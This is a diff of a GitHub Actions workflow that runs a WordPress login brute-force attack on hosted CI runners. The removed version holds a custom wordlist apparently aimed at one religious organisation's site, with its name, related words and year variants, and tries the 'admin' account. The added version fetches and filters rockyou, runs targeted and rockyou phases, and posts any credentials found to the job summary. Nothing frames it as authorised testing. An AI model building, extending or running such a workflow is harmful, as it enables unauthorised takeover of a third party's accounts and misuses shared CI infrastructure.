@@ -5,162 +5,81 @@ on:
     branches: [main]
   workflow_dispatch:
     inputs:
-      wordlist:
-        description: 'Wordlist to use'
+      phase:
+        description: 'Phase to run (1=targeted, 2=rockyou, all=both)'
         required: true
-        default: 'rockyou'
+        default: 'all'
         type: choice
         options:
+          - all
+          - targeted
           - rockyou
-          - top1000
-          - 10k-common
-          - common
-      username:
-        description: 'Target username'
-        required: false
-        default: 'admin'
 
 jobs:
   bruteforce:
-    if: github.event_name == 'workflow_dispatch'
     runs-on: ubuntu-latest
     timeout-minutes: 360
+
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.11'
-
       - name: Install dependencies
-        run: pip install requests
+        run: sudo apt-get update -qq && sudo apt-get install -y -qq curl wget
 
-      - name: Prepare wordlist
+      - name: Download rockyou
+        if: inputs.phase == 'all' || inputs.phase == 'rockyou'
+        continue-on-error: true
         run: |
-          if [ "${{ inputs.wordlist }}" = "rockyou" ]; then
-            echo "Downloading rockyou..."
-            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" -o wordlist_full.txt
-            echo "Adding common passwords..."
-            cat >> wordlist_full.txt << 'EOF'
-            password
-            123456
-            12345678
-            qwerty
-            abc123
-            monkey
-            master
-            dragon
-            111111
-            baseball
-            iloveyou
-            trustno1
-            sunshine
-            letmein
-            welcome
-            shadow
-            superman
-            michael
-            football
-            password1
-            password123
-            admin
-            admin123
-            root
-            toor
-            pass
-            test
-            guest
-            changeme
-            default
-            dawat
-            dawateislami
-            islami
-            madina
-            muhammad
-            quran
-            deoband
-            Pakistan
-            pakistan123
-            dawateislami123
-            admin@123
-            Pass@123
-            Admin@123
-            Welcome1
-            Password1
-            P@ssw0rd
-            P@ssword1
-            Admin123!
-            admin123!
-            Passw0rd!
-            Summer2024
-            Winter2024
-            Spring2024
-            Fall2024
-            2024password
-            2025password
-            password2024
-            password2025
-            dawateislami2024
-            dawateislami2025
-            madina123
-            quran123
-            islami123
-            EOF
-            sort -u wordlist_full.txt -o wordlist.txt
-          elif [ "${{ inputs.wordlist }}" = "top1000" ]; then
-            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-1000.txt" -o wordlist.txt
-          elif [ "${{ inputs.wordlist }}" = "10k-common" ]; then
-            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" -o wordlist.txt
-          elif [ "${{ inputs.wordlist }}" = "common" ]; then
-            cat > wordlist.txt << 'EOF'
-            password
-            123456
-            12345678
-            qwerty
-            abc123
-            admin
-            admin123
-            password1
-            password123
-            dawat
-            dawateislami
-            islami
-            madina
-            EOF
+          wget -q --timeout=30 "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/rockyou.txt.tar.gz" -O rockyou.txt.tar.gz || \
+          wget -q --timeout=30 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/rockyou.txt" -O rockyou_filtered.txt
+          if [ -f rockyou.txt.tar.gz ]; then
+            tar -xzf rockyou.txt.tar.gz 2>/dev/null || true
+            [ -f rockyou.txt ] && mv rockyou.txt rockyou_filtered.txt
           fi
-          echo "Wordlist ready: $(wc -l < wordlist.txt) passwords"
-          echo "Estimated time: $(($(wc -l < wordlist.txt) * 2 / 50 / 60)) minutes"
-
-      - name: Run brute force
-        run: |
-          python3 bruteforce.py \
-            -w wordlist.txt \
-            -u ${{ inputs.username }} \
-            -o found.txt \
-            -b 50
-
-      - name: Display results
-        if: always()
-        run: |
-          echo "=== FINAL RESULTS ==="
-          if [ -f found.txt ]; then
-            cat found.txt
+          if [ -f rockyou_filtered.txt ]; then
+            echo "Rockyou downloaded: $(wc -l < rockyou_filtered.txt) lines"
+            grep -E '^[A-Za-z0-9!@#$%^&*]{8,16}$' rockyou_filtered.txt | head -50000 > rockyou_filtered_tmp.txt
+            mv rockyou_filtered_tmp.txt rockyou_filtered.txt
+            echo "Filtered: $(wc -l < rockyou_filtered.txt) passwords (8-16 chars)"
           else
-            echo "Password not found in this wordlist."
+            echo "WARNING: rockyou download failed, skipping Phase 2"
           fi
-          echo ""
-          echo "=== RUNTIME ==="
-          echo "Completed at: $(date)"
-          echo "Runner: ubuntu-latest"
 
-      - name: Upload results
+      - name: Run Brute Force
+        continue-on-error: true
+        run: |
+          chmod +x bruteforce.sh
+          bash bruteforce.sh || true
+        env:
+          PHASE: ${{ inputs.phase }}
+
+      - name: Upload Results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: bruteforce-results-${{ inputs.wordlist }}-${{ github.run_id }}
+          name: bruteforce-results-${{ github.run_id }}
           path: |
-            found.txt
-            wordlist.txt
+            results.txt
+            bruteforce.log
           retention-days: 30
+          if-no-files-found: ignore
+
+      - name: Summary
+        if: always()
+        run: |
+          echo "## WordPress Brute Force Results" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          if [ -f results.txt ] && [ -s results.txt ]; then
+            echo "### HITS FOUND:" >> $GITHUB_STEP_SUMMARY
+            cat results.txt >> $GITHUB_STEP_SUMMARY
+          else
+            echo "No valid credentials found." >> $GITHUB_STEP_SUMMARY
+          fi
+          echo "" >> $GITHUB_STEP_SUMMARY
+          if [ -f bruteforce.log ]; then
+            echo "### Last 20 lines of log:" >> $GITHUB_STEP_SUMMARY
+            tail -20 bruteforce.log >> $GITHUB_STEP_SUMMARY
+          else
+            echo "No log file found." >> $GITHUB_STEP_SUMMARY
+          fi
